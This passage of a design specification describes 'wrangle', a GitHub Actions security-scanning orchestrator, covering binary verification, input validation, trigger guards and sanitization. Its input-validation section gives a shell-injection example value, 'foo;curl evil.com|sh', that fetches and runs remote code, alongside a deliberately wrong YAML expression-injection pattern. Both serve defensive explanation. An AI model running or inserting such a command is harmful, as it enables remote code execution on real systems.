    The three methods above apply to standalone binary installs (downloaded
    artifact + separate verification step routed through
    lib/download_verify.sh). Tools fetched as Go modules via
    `go install <module>@<version>` are integrity-verified by the Go
    toolchain itself against sum.golang.org, a Trillian-backed transparency
    log. This path is accepted ONLY when no upstream binary release exists
    for the tool (so the three methods above cannot be used against an
    artifact) and the gating conditions in CLAUDE.md §"Supply Chain
    Discipline" — pinned semver, trusted toolchain, documented rationale,
    and `GOPROXY`/`GOSUMDB` not disabled — are all met.

    The tlog provides transparency-log immutability ("first-seen go.sum
    line for this (module, version) is what every consumer that consults
    sum.golang.org sees" — consumers with `GOSUMDB=off` see whatever
    their proxy serves), NOT publisher authentication. A compromised upstream maintainer's
    malicious release would still install and be recorded; detection is
    after-the-fact, via auditing. The no-fallback rule still applies: if
    `go install` aborts due to a go.sum mismatch, the install MUST fail
    rather than retry under `GOSUMDB=off`.

    Note on the recommended `GOPROXY=https://proxy.golang.org,direct`
    value: the `,direct` segment is a fallback path that only fires
    when the proxy itself is unreachable, and it does NOT bypass
    sum.golang.org — `GOSUMDB` is consulted on both proxy and direct
    fetches. (This is distinct from a bare `GOPROXY=direct`, which
    also routes around the proxy but is paired with sumdb the same
    way.) The integrity claim is preserved across the proxy/direct
    fallback; only `GOSUMDB=off` (or one of the bypass vars listed in
    CLAUDE.md §"Supply Chain Discipline") would weaken it.

  Tools with sum.golang.org (go install) only: govulncheck

  The download/verify flow:
    1. Download binary to a temporary file ($RUNNER_TEMP/wrangle-dl-XXXXX)
    2. Verify using the tool's configured method (provenance, signature,
       or checksum — exactly one)
    3. If verification fails: delete temp file, exit 1
    4. Atomically move (mv) to $WRANGLE_BIN_DIR/<tool>

INSTALL DIRECTORY:
  Binaries are installed to $WRANGLE_BIN_DIR, which defaults to
  $RUNNER_TEMP/.wrangle/bin. This directory:
  - Is wrangle-specific (no conflicts with system tools)
  - Is ephemeral on GitHub-hosted runners (cleaned up after the job)
  - Is prepended to $PATH by the composite action
  - MUST NOT be /usr/local/bin or other system directories

IDEMPOTENCY:
  Install scripts MUST be safe to run multiple times. On self-hosted runners
  where $RUNNER_TEMP persists, use atomic mv (not cp) to prevent TOCTOU
  races between the version check and binary placement.
```

### Orchestrator Interface

`run.sh` (at the repo root) installs and runs multiple adapters.

**Contract:**

```
USAGE:  run.sh [-s <src_dir>] [-o <output_dir>] <tool1> [tool2] ...

OPTIONS:
  -s src_dir     Source directory to scan (default: .)
  -o output_dir  Output directory for results (default: ./metadata)

ARGUMENTS:
  tool1, tool2   Tool specs to run (e.g., osv, zizmor, scorecard:info).
                 Optional :fail/:info suffix is stripped before processing.
                 Action-pattern tools (no adapter.sh) are silently skipped.

BEHAVIOR:
  For each tool:
    1. Strip :policy suffix if present (run.sh does not use the policy —
       that is handled by lib/check_results.sh in the scan action)
    2. Validate tool name matches ^[a-z][a-z0-9_-]*$ (reject otherwise)
    3. Verify tools/<tool>/ directory exists (reject if not — unknown tool)
    4. Skip if tools/<tool>/adapter.sh or tools/<tool>/install.sh missing
       (the tool is action-pattern, handled by uses: steps in the scan action)
    5. Run tools/<tool>/install.sh (timeout: 5 minutes)
    6. Create <output_dir>/<tool>/
    7. Run tools/<tool>/adapter.sh <src_dir> <output_dir>/<tool>/ (timeout: 10 minutes)
    8. Record pass/fail status

  After all tools:
    9. Print summary table to stdout

TIMEOUTS:
  Each adapter invocation is wrapped in `timeout(1)` to prevent a hung tool
  from consuming the entire GitHub Actions job timeout (default 6 hours).

  Default timeouts:
    - Install scripts: 5 minutes (sufficient for binary download + verify)
    - Adapter scripts: 10 minutes (sufficient for scanning large repos)

  A timeout expiration is treated as exit code 2 (tool failure). The
  orchestrator logs the timeout and continues to the next tool.

EXIT CODES:
  0  All tools passed with no findings
  1  At least one tool found issues
  2  At least one tool failed to run (includes invalid tool names)

INPUT VALIDATION:
  Tool names MUST match the regex ^[a-z][a-z0-9_-]*$. This prevents:
  - Path traversal (e.g., ../../etc/passwd)
  - Shell injection (e.g., foo;curl evil.com|sh)
  - Glob expansion and word splitting

  All variable expansions MUST be quoted ("$@", "$tool", "${output_dir}")
  throughout the orchestrator and adapter scripts.

ENVIRONMENT ISOLATION:
  The orchestrator clears sensitive environment variables before invoking
  adapters. See the adapter API ENVIRONMENT section for the allowlist.

NOTES:
  The orchestrator resolves adapter and install script paths relative to its
  own location (using $0 / BASH_SOURCE), not the caller's working directory.
  This is critical for portability when called via github.action_path.
```

---

## Composite Action Interface

The scan action (`actions/scan/action.yml`) is the primary entry point for GitHub Actions users.

```yaml
name: Wrangle Source Scan
description: Scan source code with wrangle security tools

inputs:
  tools:
    description: >
      Space-separated list of tools to run. Suffix with :info for
      informational-only (default policy: :fail).
    required: false
    default: "osv zizmor scorecard:info"

# No secrets required — tools are downloaded as public binaries
```

**Tool policy syntax:** Each tool in the `tools` input accepts an optional `:fail` or `:info` suffix. The default is `:fail` — findings from the tool cause a non-zero exit. `:info` means findings are noted in the summary but do not block the check. This is useful for tools like Scorecard that assess repo-level posture rather than per-change vulnerabilities. Adopters can override the default policy (e.g., `scorecard:fail` to enforce Scorecard scores).

The scan action parses the `tools` input to dispatch adapter-pattern tools (those with `tools/<name>/adapter.sh`) to the orchestrator (`run.sh`) and invokes action-pattern tools via their static `uses:` steps. The `lib/check_results.sh` script evaluates all tool SARIF against their policies.

**Behavior:**
1. Checks out the calling repo
2. Runs the orchestrator with adapter-pattern tools (e.g., OSV)
3. Runs action-pattern tools (Zizmor, Scorecard)
4. Generates a markdown summary in the GitHub Actions step summary (primary output)
5. Checks results — fails the check if any tool (except informational ones) found issues
6. Uploads SARIF to GitHub Code Scanning (optional bonus — may not be available on private repos)
7. Uploads all results as an artifact for debugging and future attestation

The **step summary is the primary output**. It works on all repos — private, no Advanced Security, etc. SARIF upload to the Security tab is additive. The **metadata directory** (`$GITHUB_WORKSPACE/.wrangle/metadata/`) is a complete catalog of which tools ran and what they found, enabling future signed attestations.

**Portability:** Shell script paths use `${{ github.action_path }}` for resolution relative to the composite action's own directory. Action-pattern tool steps use `./` paths (e.g., `uses: ./tools/zizmor`), which resolve to the same repo at the called ref — so when an adopter pins `@v0.1.0`, all internal actions resolve at that tag, and when wrangle's own CI runs on a PR branch, they resolve at the PR's code.

**Path constraint:** The composite action resolves the orchestrator via `${{ github.action_path }}/../../run.sh`, which means the scan action MUST remain at exactly `actions/scan/` (two directories below the repo root). This is a hard structural constraint — moving the action to a different depth breaks the relative path. If the directory layout changes, these paths must be updated in the same commit.

**Input safety:** The `tools` input is passed to the orchestrator via an environment variable, never via direct `${{ }}` interpolation in `run:` blocks. This prevents expression injection:

```yaml
# CORRECT — input passed via env var
env:
  WRANGLE_TOOLS: ${{ inputs.tools }}
run: ${{ github.action_path }}/../../run.sh $WRANGLE_TOOLS

# WRONG — direct interpolation enables injection
run: ${{ github.action_path }}/../../run.sh ${{ inputs.tools }}
```

Note: `$WRANGLE_TOOLS` is intentionally unquoted so it word-splits into multiple arguments. This is safe because the orchestrator validates each token against `^[a-z][a-z0-9_-]*$` before use, and the orchestrator runs `set -f` (disable globbing) before processing arguments. Defense in depth: even if a glob character survived the regex, it would not expand.

The scan action strips `:fail`/`:info` suffixes before passing tool names to the orchestrator. The full `tool:policy` list is passed to `lib/check_results.sh` for result evaluation.

---

## Reusable Workflow Interface

The reusable workflow (`.github/workflows/check_source_change.yml`) wraps the composite action for `workflow_call` consumers.

**Internal path resolution:** All `uses:` steps inside the reusable workflow use `./` paths (e.g., `uses: ./actions/scan`). When a caller invokes the workflow at a specific ref (e.g., `@v0.1.0`), GitHub fetches the workflow at that ref, and all `./` references resolve to the same repo at that ref. This means adopters automatically get version-locked internal actions matching their pinned tag, and wrangle's own PR CI tests the PR branch's code (not main).

```yaml
on:
  workflow_call:
    inputs:
      tools:
        description: "Space-separated list of tools to run (suffix :info for informational)"
        required: false
        type: string
        default: "osv zizmor scorecard:info"
# No secrets required
```

**Adopter workflow (what goes in the adopting repo):**

```yaml
name: Check Source Change
on:
  push:
    branches: ["main"]
  pull_request:
    branches: ["**"]

jobs:
  check-change:
    permissions:
      actions: read
      contents: read
      security-events: write
    uses: TomHennen/wrangle/.github/workflows/check_source_change.yml@v0.1.0
```

This is the entire file an adopter needs. No secrets, no configuration, no dependencies to manage.

---

## Supported Tools (v0.1)

| Tool | Pattern | What it does |
|------|---------|-------------|
| [OSV-Scanner](https://github.com/google/osv-scanner) | Adapter | Scans dependencies against the OSV database |
| [Zizmor](https://github.com/zizmorcore/zizmor) | Action (wraps `zizmorcore/zizmor-action`) | Security-focused linting of GitHub Actions workflows |
| [OSSF Scorecard](https://scorecard.dev/) | Action (wraps `ossf/scorecard-action`) | Assesses repo security health across 18+ categories |
| [Dependency Review](https://github.com/actions/dependency-review-action) | Action (wraps `actions/dependency-review-action`) | PR-time gate: blocks PRs that introduce known-vulnerable dependencies. Runs on `pull_request` events only |

### Two Tool Patterns

Every tool lives in `tools/<name>/` regardless of which pattern it uses. There are two patterns:

**Adapter pattern** — for tools distributed as standalone binaries (e.g., OSV-Scanner). The orchestrator (`run.sh`) handles installation and execution:

```
tools/<name>/
├── install.sh    # Downloads + verifies the tool binary
├── adapter.sh    # Runs the tool, produces SARIF
└── test.bats     # Tests for both scripts
```

**Action pattern** — for tools that have an official GitHub Action or are best installed via their ecosystem's package manager (e.g., Zizmor, Scorecard). A thin composite action wraps the upstream action:

```
tools/<name>/
├── action.yml    # Composite action wrapping the upstream action
└── test.bats     # Structural tests + CI integration tests
```

**Tool-error marker contract (action pattern).** Action-pattern wrappers cannot rely on the upstream action's exit code alone: `continue-on-error: true` is typically required so wrangle's own collection step runs after the upstream exits non-zero on findings, which also swallows genuine tool errors. Without a separate signal an errored run produces an empty SARIF that `lib/check_results.sh` reads as "no findings" — silently fail-open (issue [#222](https://github.com/TomHennen/wrangle/issues/222)).

To close that gap, action-pattern wrappers SHOULD write a per-tool marker file at `$WRANGLE_METADATA_DIR/<tool>/error` (via `lib/write_tool_error_marker.sh`) whenever the upstream step fails in a way that does NOT correspond to "found issues" (e.g., API unavailable, dependency database disabled, malformed upstream output, image-pull failure mid-run). Contract:

1. The marker is a plain text file. Its first line is logged by `lib/check_results.sh` after passing through `wrangle_sanitize_output`, so wrappers do not need to pre-sanitize upstream output.
2. `lib/check_results.sh` treats the marker as **fail-closed** for `:fail` policy (non-zero exit) and **informational** for `:info` policy.
3. The marker takes precedence over the SARIF count. Wrappers MAY also write a synthesized empty SARIF as a fallback so downstream consumers (step summary, Code Scanning upload) always have a file; the marker prevents that fallback from being misread as zero findings.
4. `lib/format_sarif_summary.sh` surfaces a `Tool error` status in the step-summary table when the marker is present, and the per-tool Code Scanning upload in `actions/scan/action.yml` SHOULD be gated on the marker's absence to avoid overwriting prior valid runs with an empty SARIF.

The marker is the canonical signal — adapter-pattern tools already disambiguate via their exit code (0/1/2) per the Adapter Contract above, so they do not write a marker.

Use the action pattern when:
- The tool has a well-maintained official GitHub Action
- The tool's recommended installation method requires an ecosystem runtime (cargo, pip, etc.) that wrangle shouldn't depend on
- The tool requires the GitHub Actions context (repository metadata, API access) that the adapter pattern's environment isolation strips

Use the adapter pattern when:
- The tool publishes standalone release binaries as its primary distribution
- The tool can run without GitHub Actions context
- You want the strongest environment isolation (adapters run with stripped env vars)

### Supported Platforms (v0.1)

v0.1 targets **Linux x86_64** (Ubuntu) runners only. This is what GitHub-hosted `ubuntu-latest` provides and covers the vast majority of CI workloads.

The install scripts include OS/arch detection (`linux/darwin`, `amd64/arm64`) as forward-looking scaffolding, but macOS and ARM runners are not tested or guaranteed to work in v0.1. Platform support will expand based on demand.

### Adding a New Tool

**Adapter pattern** (standalone binary):

1. Create `tools/foo/` directory with:
   - `install.sh` — uses `lib/download_verify.sh` for download and verification
   - `adapter.sh` — follows the adapter contract above
   - `test.bats` — tests using mock binaries (fast, deterministic)
2. Add `foo` to the orchestrator's default tool list in `actions/scan/action.yml`

**Action pattern** (wraps upstream GitHub Action):

1. Create `tools/foo/` directory with:
   - `action.yml` — composite action that wraps the upstream action. Must pin the upstream action to a full commit SHA. Must write SARIF output to `$WRANGLE_METADATA_DIR/foo/output.sarif` (workspace-relative, set by the scan action via `$GITHUB_ENV`). Must also produce human-readable output as `output.md` (via `lib/sarif_to_md.sh` or a tool-specific formatter) or `output.txt` for the step summary details section. Must print a log attribution banner (via `lib/tool_banner.sh`) as the first step.
   - `test.bats` — structural tests (action.yml exists, SHA pinned, etc.)
2. Add a `uses: ./tools/foo` step in `actions/scan/action.yml`

Everything for one tool lives in one directory. No Docker images, no registry management, no workflow changes for adopters.

### Tool Sub-specifications

Each tool's detailed specification lives in `tools/<name>/SPEC.md` alongside the code it describes. Summary:

| Tool | Pattern | Default policy | Details |
|------|---------|---------------|---------|
| OSV-Scanner | Adapter | `:fail` | [`tools/osv/SPEC.md`](../tools/osv/SPEC.md) |
| Zizmor | Action | `:fail` | [`tools/zizmor/SPEC.md`](../tools/zizmor/SPEC.md) |
| OSSF Scorecard | Action | `:info` | [`tools/scorecard/SPEC.md`](../tools/scorecard/SPEC.md) |
| Dependency Review | Action | `:fail` | [`tools/dependency-review/SPEC.md`](../tools/dependency-review/SPEC.md) |

### Metadata Directory

The metadata directory (`$GITHUB_WORKSPACE/.wrangle/metadata/`) is workspace-relative. This is required because Scorecard's Docker container only mounts `$GITHUB_WORKSPACE`, not `$RUNNER_TEMP`. The directory is set via `$GITHUB_ENV` as `WRANGLE_METADATA_DIR` and is available to all steps in the job.

Structure after a scan:
```
.wrangle/metadata/
├── osv/
│   └── output.sarif
├── zizmor/
│   ├── output.sarif
│   ├── output.md
│   └── error           # optional: tool-error marker (action pattern only)
└── scorecard/
    ├── output.sarif
    └── output.md
```

The optional `error` file is the tool-error marker for action-pattern tools — see "Tool-error marker contract" under [Two Tool Patterns](#two-tool-patterns).

The `.wrangle/` directory is in `.gitignore` to prevent accidental commits. The orchestrator's filesystem check (`run.sh`) excludes the metadata directory from its pre/post snapshots.

**Future use:** The metadata directory is designed to become the source for signed attestations: "this commit was scanned by tools X, Y, Z with these results."

---

## Design Decisions

### Binary downloads over Docker images

**Previous approach:** Tools were wrapped in Docker images, pushed to ghcr.io, and run via `docker run` with volume mounts.

**New approach:** Tools are downloaded as standalone binaries and run directly.

**Rationale:**
- **Speed:** No image pull latency (cached binary downloads are near-instant)
- **Simplicity:** No container registry to manage, no image build pipeline
- **Portability:** Works on any runner (macOS, self-hosted, ARM — not just Linux with Docker)
- **Testability:** No Docker-in-Docker complexity; scripts testable with bats-core locally
- **Adoption friction:** No authentication needed to pull tool images

The container *build/publish* workflow (for building adopters' Docker images) remains unchanged.

### Reusable workflow + composite action (two layers)

The reusable workflow exists so adopters get a clean `uses:` interface with `workflow_call`. The composite action exists so the implementation can use `${{ github.action_path }}` for path resolution. GitHub requires this split because reusable workflows cannot use `github.action_path`.

### SARIF as the universal output format

All tools produce SARIF 2.1.0. This enables:
- Upload to GitHub Code Scanning (appears in Security tab)
- Consistent programmatic processing across tools
- A single summary formatter for all tools

Human-readable output (markdown/text) is optional and used only for step summaries.

### Per-tool SARIF uploads (not merged)

Each tool's SARIF file is uploaded to GitHub Code Scanning separately via `github/codeql-action/upload-sarif` with a per-tool `category` (e.g., `wrangle/osv`, `wrangle/zizmor`). This means:
- Each tool appears as a separate check run in the Security tab
- Findings are attributed to the specific tool that found them
- A noisy tool can be identified and tuned without affecting others

The alternative (merging all SARIF into one file) was rejected because it loses tool attribution and makes it harder to diagnose which tool produced which finding.

---

## Security Model

### Threat Model

Wrangle runs security tools on behalf of adopting repositories. This makes it a high-value target — a compromised wrangle could affect every adopter. The primary threats are:

1. **Compromised upstream tool release** — a malicious binary is published to a tool's GitHub releases page
2. **Compromised wrangle itself** — an attacker gains commit access to the wrangle repo
3. **Malicious adapter inputs** — attacker-controlled data flows into shell commands
4. **Tool misbehavior** — a tool writes outside its output directory, exfiltrates data, or produces malicious SARIF
5. **Adopter trigger misconfiguration** — an adopter wires wrangle's reusable workflows under a GitHub Actions trigger that runs attacker-influenced code in the base repo's privileged context. See "Trigger Model" below.

### Trigger Model

Every wrangle reusable workflow runs a `guard` job at the head of `jobs:` (the [`actions/preflight_guard`](../actions/preflight_guard/action.yml) composite action). Refusal fails the workflow; every other job declares `needs: [guard]` so a refused invocation skips the entire run — no OIDC tokens minted, no privileged actions executed, no docker push, no provenance generation.

**Triggers wrangle's reusable workflows are designed for:**

- `push` to `main`, release branches, or tags.
- `push` to integration test branches (e.g., `integration/**` used by `test/integration/dispatch.sh`).
- `workflow_dispatch` (manual).
- `workflow_call` (when one wrangle reusable workflow wraps another internally).

**Triggers `preflight_guard` refuses:**

- `pull_request_target` — runs in the **base** repo's privileged context with the base repo's secrets, while a checkout of `${{ github.event.pull_request.head.sha }}` brings in PR-author code. This is the "pwn request" vector: attacker code executes with secrets it shouldn't have. The TanStack/router Mini Shai-Hulud compromise (May 2026) is the most-cited recent exploitation.
- `workflow_run` triggered by `pull_request_target` — indirect form of the same vector. The outer event (`github.event.workflow_run.event`) is checked, not just `github.event_name`.

**Triggers `preflight_guard` does NOT (currently) refuse but adopters should still be careful about:**

- `pull_request` from a fork that the workflow then `checkout`s with `ref: ${{ github.event.pull_request.head.sha }}` — this is the same untrusted-checkout pattern but without base-repo privileges, so the blast radius is smaller. `actions/scan`'s `zizmor` runs in wrangle's source-scan path catches this finding for adopters.
- `workflow_dispatch` chains where an upstream workflow was itself `pull_request_target`-triggered — GitHub flattens the event chain to `workflow_dispatch` and the guard sees only that. Out of scope; the `workflow_run`-via-`pull_request_target` check covers the most common indirect vector.

**Guard vs. gate — two preflight check shapes:**

Wrangle's reusable workflows have two kinds of checks that sit at workflow start. Different mechanisms, different jobs to gate downstream on:

| | `actions/preflight_guard` | `actions/release_gate` |
|---|---|---|
| **What it does** | Refuses the workflow run if the trigger is unsafe | Decides whether release-time actions should run this event/ref |
| **Mechanism** | Fails (`exit 1`) on a refused trigger | Outputs `should-release: true/false` |
| **Downstream uses it as** | `needs: [guard]` — fail propagation | `if: needs.gate.outputs.should-release == 'true'` — signal branching |
| **What happens on a "no"** | Whole workflow fails; everything skips | Workflow succeeds; non-release jobs (build, test) still run; release-time jobs (provenance, publish) skip |
| **Why this shape** | A green ✅ with everything skipped would hide the misconfiguration — fail-loud is the security-relevant property | Legit non-release events (PR builds) should still run build/test, just not provenance/publish |

The `_guard` / `_gate` suffix is the name's contract: `_guard` = abort on fail, `_gate` = signal and let downstream branch.

**Adding refusal categories:** add the check to `actions/preflight_guard/preflight_guard.sh`, add a matching row to the "refuses" list above, and add a structural assertion to `actions/preflight_guard/test.bats`.

### Integrity Verification

All downloaded binaries are verified before execution:

| Layer | Mechanism | Status |
|-------|-----------|--------|
| Transport | HTTPS only | Always required |
| Content | SHA-256 checksum (pinned in install script) | Required for tools without provenance or signatures |
| Provenance | SLSA attestation via slsa-verifier | Required for tools that publish it; sufficient on its own; failure = hard stop |
| Signature | Sigstore/Cosign signature verification | Required for tools that publish it; sufficient on its own; failure = hard stop |
| sum.golang.org tlog (`go install`) | Built-in Go toolchain verification against the transparency log | Narrow fourth tier for Go modules with no upstream binary release; gating conditions in CLAUDE.md §"Supply Chain Discipline"; failure (go.sum mismatch) = hard stop |

For tools verified via SLSA provenance or Sigstore signatures, hardcoded checksums are not required — the cryptographic verification already covers artifact integrity. Checksums are only needed for tools that lack both provenance and signatures, in which case they are hardcoded in each install script (not downloaded alongside the binary) and updated in the same commit as a version bump.

The sum.golang.org tier is accepted only for Go modules installed via `go install` and only when no upstream binary release exists. The tlog provides transparency-log immutability, not publisher authentication — a compromised maintainer's bad release would still install. See CLAUDE.md §"Supply Chain Discipline" for the full acceptance gate (pinned semver, trusted Go toolchain, documented rationale, `GOPROXY`/`GOSUMDB` not disabled).

**No fallback between verification methods.** Each tool's verification method is chosen at development time. If provenance verification fails for a tool configured to use it, the install MUST fail — even if the checksum passed. A verification failure may indicate a supply chain attack; silently downgrading to a weaker method would mask the attack.

**Version upgrade workflow:** To update a tool version, run `make update-tool TOOL=osv VERSION=x.y.z`. This helper downloads the new binary, computes its SHA-256 checksum, and patches the install script. The contributor then verifies the change, commits both the version and checksum update together, and opens a PR. Dependabot is not used for tool binaries because it cannot update hardcoded checksums.

### Shared Download/Verify Library

`lib/download_verify.sh` provides helper functions used by all install scripts:

```bash
# Download a file and verify its SHA-256 checksum
# Usage: wrangle_download_verify <url> <expected_sha256> <output_path>
# Retries up to 3 times with exponential backoff (1s, 2s, 4s) on transient
# download failures (CDN blips, rate limits, DNS hiccups).
# Exits 1 on checksum mismatch or exhausted retries (temp file is deleted).
wrangle_download_verify() { ... }

# Verify SLSA provenance for a downloaded artifact
# Usage: wrangle_verify_provenance <artifact_path> <source_repo> <expected_tag>
# Exits 0 on success, 1 on failure (including tool not available)
# IMPORTANT: Returns 1 if slsa-verifier is not installed. Callers
# MUST NOT fall back to weaker verification on failure.
wrangle_verify_provenance() { ... }

# Verify Sigstore signature for a downloaded artifact
# Usage: wrangle_verify_signature <artifact_path> <expected_identity> <expected_issuer>
# Exits 0 on success, 1 on failure (including tool not available)
# IMPORTANT: Returns 1 if cosign is not installed. Callers
# MUST NOT fall back to weaker verification on failure.
wrangle_verify_signature() { ... }
```

All install scripts MUST use `wrangle_download_verify` rather than implementing their own download logic. This ensures consistent integrity verification and makes security fixes apply everywhere.

### Shared Tool Helpers

`lib/sarif_to_md.sh` converts SARIF 2.1.0 to a human-readable markdown table. It is the default formatter for action-pattern tools that don't have a tool-specific formatter. Tools with richer output (e.g., Scorecard's `sarif_to_markdown.sh`) may use their own formatter instead.

```
# Usage: sarif_to_md.sh <sarif_file>
# Output format (markdown table):
#   | Severity | Rule | Location | Message |
#   | -------- | ---- | -------- | ------- |
#   | HIGH | rule-id | `file.yml:39` | Message text |
#
# Exit codes:
#   0  Success (including no findings)
#   1  Missing argument or file
#   2  Invalid JSON or malformed SARIF
```

`lib/tool_banner.sh` prints a visual banner for tool log attribution in CI logs. Action-pattern tools call this as their first step to make tool boundaries visible in raw log output.

```
# Usage: tool_banner.sh <tool_name>
# Output:
#   ========================================
#    wrangle/<tool_name>
#   ========================================
```

`lib/sanitize.sh` provides `wrangle_sanitize_output()`, a shared function that strips HTML tags and truncates output to `$WRANGLE_MAX_SUMMARY` (default 65536) characters. Sourced by `format_sarif_summary.sh` and `sarif_to_md.sh`. All tool output written to `$GITHUB_STEP_SUMMARY` MUST be passed through this function to prevent HTML/markdown injection.

Action-pattern tools call these helpers from their own `action.yml`. The `format_sarif_summary.sh` script picks up `output.md` (or `output.txt`) to populate the expandable details section in the step summary. **Fallback:** if neither `output.md` nor `output.txt` is present for a tool but `output.sarif` is, `format_sarif_summary.sh` invokes `sarif_to_md.sh` to render the findings table directly. This makes the adapter-contract claim above (orchestrator generates `output.md` from SARIF) hold in the step summary, so adopters can see WHAT was found without opening the raw SARIF artifact. The fallback is skipped when SARIF reports zero findings — the top table already shows "No findings" for that tool. Note: the fallback path is bounded by `wrangle_sanitize_output` inside `sarif_to_md.sh`, so it shares a single `$WRANGLE_MAX_SUMMARY` (64 KB) budget; tools that ship their own `output.md` get a separate 64 KB budget on the `wrangle_sanitize_output < output.md` path.

`lib/log_findings.sh` emits one CI-log line per finding so adopters (and AI agents) can see WHAT each tool flagged without parsing raw SARIF. Invoked once after all adapters by the scan composite action; runs before `lib/check_results.sh` so per-finding context appears above the failure line in the log.

```
# Usage: log_findings.sh <metadata_dir>
# Output (one line per finding, to stdout):
#   wrangle: <tool>[<i>/<n>] <ruleId> <uri>:<line> -- <truncated message>
#
# Environment:
#   WRANGLE_MAX_FINDING_MESSAGE  Max characters for per-finding message
#                                (default 100). Truncation runs inside
#                                jq, so it is char-based — multibyte
#                                UTF-8 sequences stay intact.
#
# Exit codes:
#   0  Success — including malformed SARIF (silently skipped so this
#      script does not double-report against check_results.sh, which
#      is the pass/fail gate). Always exits 0 in the happy path so a
#      missing/empty metadata dir does not break the composite action.
#   2  Usage error (missing/extra args)
#
# All fields (ruleId, uri, message) are passed through
# wrangle_sanitize_output (HTML strip + WRANGLE_MAX_SUMMARY truncate)
# and have \r\n\t collapsed to spaces so each finding stays on one
# log line. Only locations[0] (the SARIF-defined primary location) is
# rendered — one log line per result, never N×M.
```

### Sandboxing and Isolation

**What's enforced:**
- Tool names are validated against `^[a-z][a-z0-9_-]*$`
- Sensitive environment variables are stripped before adapter execution
- All shell variable expansions are quoted to prevent injection
- Inputs are passed via environment variables, not `${{ }}` interpolation

**What's NOT enforced (known limitations):**
- Adapters run directly on the runner with no filesystem isolation. A malicious tool binary could read/write anywhere the runner user can. The previous Docker-based design provided container isolation; the binary-download approach trades this for speed and simplicity.
- No egress restrictions on tool network access. A compromised tool could exfiltrate source code.
- No runtime monitoring of tool behavior (process spawning, file access).

**Mitigations for known limitations:**
- Integrity verification (checksums + SLSA provenance) is the primary defense against malicious binaries
- GitHub-hosted runners are ephemeral, limiting the blast radius of any compromise
- For self-hosted runners, adopters should use [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) alongside wrangle for network monitoring
- Post-execution filesystem check: the orchestrator snapshots the workspace file list before and after each adapter run, flagging any unexpected file modifications outside `output_dir`
- Future versions may use lightweight sandboxing (bubblewrap, firejail) on Linux runners

### Protecting Wrangle Itself

Wrangle is a supply chain amplifier — a compromise of wrangle propagates to every adopter. Protections for the wrangle repo itself:

- **[SLSA Source Track](https://slsa.dev/spec/v1.2/):** Wrangle adopts the SLSA source track via [slsa-framework/source-tool](https://github.com/slsa-framework/source-tool) to enforce branch protection, generate source provenance attestations, and establish a verifiable chain of trust for its own source code. This protects against threat #2 (compromised wrangle).
- **Action reference pinning:** All third-party actions pinned to full commit SHAs (protects against upstream action compromise).
- **Signed commits:** All commits to the wrangle repo should be signed.
- **Minimal permissions:** Wrangle's own workflows request only the permissions they need.
- **Dependency management:** Dependabot for GitHub Actions dependencies; `make update-tool` for tool binary versions.
- **SLSA build provenance:** When wrangle produces releasable artifacts (e.g., if it ships a CLI or pre-built actions), those artifacts should have SLSA L3 build provenance via `actions/attest-build-provenance` run inside a reusable build workflow, the same standard wrangle helps adopters achieve. Aspirational — not currently in a numbered release milestone.
- **Delayed dependency updates:** Wrangle does not auto-merge dependency updates immediately. New versions of upstream tools are adopted only after a delay (e.g., 7 days) to allow the community to discover supply chain attacks before wrangle amplifies them to all adopters. This follows the [OpenSSF Concise Guide for Evaluating Open Source Software](https://best.openssf.org/Concise-Guide-for-Evaluating-Open-Source-Software) principle of not being the first to adopt a new release.

### Action Reference Pinning

All `uses:` references in wrangle's own workflows and examples MUST be pinned:

| Reference type | Pinning requirement |
|---------------|---------------------|
| Third-party actions | Full commit SHA |
| Wrangle's own actions (in examples) | Release tag (e.g., `@v0.1.0`) |
| Wrangle internal refs in reusable workflows | Relative path (`./`) — resolves to the workflow's own repo at the called ref |
| Wrangle internal refs in composite actions | Relative path (`./`) — resolves to the same repo at the called ref |

Adopters are advised to pin to a release tag. The `@main` ref MUST NOT appear in any `uses:` line in the repo, including examples and documentation.

### Output Sanitization

Tool output (SARIF, markdown, plain text) flows into `$GITHUB_STEP_SUMMARY` and GitHub Code Scanning. Before writing to the step summary:
- HTML tags are stripped
- Output is truncated to prevent summary flooding
- Markdown is limited to safe formatting (no raw HTML, no JavaScript links)
- `jq` exit codes are checked; malformed SARIF causes a tool failure (exit 2), not a silent pass

---

## Testing Strategy

### Local (fast, TDD-friendly)

```bash
make test    # Runs all local checks
```

Layers:
1. **actionlint** — validates all workflow and action YAML files
2. **shellcheck** — lints all shell scripts
3. **bats-core** — unit tests for adapters, install scripts, orchestrator, and formatter
4. **SARIF schema validation** — validates fixture/output SARIF against the 2.1.0 JSON schema
5. **zizmor** — workflow security linter run against `.github/workflows/`, `actions/`, `tools/`, `build/`. Findings fail `make test`; the only suppression surface is `.zizmor.yml`.

`./test.sh` (the canonical preflight) runs all of the above. Use `./test.sh quick` for an inner-loop iteration that skips zizmor when you're only touching shell or bats fixtures — but the full suite must pass before pushing. `./test.sh ci` is an explicit alias for the full suite.

**Adapter testing pattern:** Per-tool `test.bats` files (in `tools/<name>/`) test the adapter and install scripts in isolation using mock tool binaries that produce fixture SARIF. This keeps local tests fast and deterministic. The `test/` directory contains integration tests that exercise the orchestrator and composite action end-to-end, plus shared fixtures (sample SARIF files, SARIF JSON schema) and CI-specific tests that download real tools and run them against the wrangle repo itself (dogfooding).

### CI (integration)

`.github/workflows/test.yml` runs `make test` plus integration tests that exercise the composite action via `uses: ./actions/scan`.

### End-to-end (cross-repo)

[TomHennen/Concordance](https://github.com/TomHennen/Concordance) serves as the external test repo. A successful run there proves the full adoption path works.

---

## Adoption Path

### For humans

If the repo has a wrangle build type, adopt the matching `build_and_publish_*` example instead — it scans and builds, so a separate scan workflow is redundant. For a repo with no build type, adopt source scanning only:

1. Copy the workflow from `gh_workflow_examples/check_source_change.yml` into your repo at `.github/workflows/check_source_change.yml`
2. Adjust the branch name if your default branch isn't `main`
3. Push. Done.

### For AI agents and new adopters

The README's quick-start section and the workflow examples in `gh_workflow_examples/` provide adoption instructions. Together they MUST cover:

1. A single-command adoption instruction (e.g., "create this file at this path")
2. The exact workflow YAML to use, parameterized by project type
3. The required GitHub permissions
4. How to detect project type (check for Dockerfile, language files, etc.)
5. Expected output after adoption (what the user should see on their next PR)

If the project type is unknown (no Dockerfile, no recognized language files), adopt only the source scanning workflow — this is always applicable regardless of project type.

`AGENTS.md` in the repo root may additionally provide AI-agent-specific instructions. It is not required; the README and examples are the primary adoption surface.

### Long-term: OpenSSF contribution

The adapter pattern and tool composition logic are candidates for contribution to OpenSSF (e.g., as part of Minder or a new working group). The spec and implementation will be designed with this handoff in mind.

---

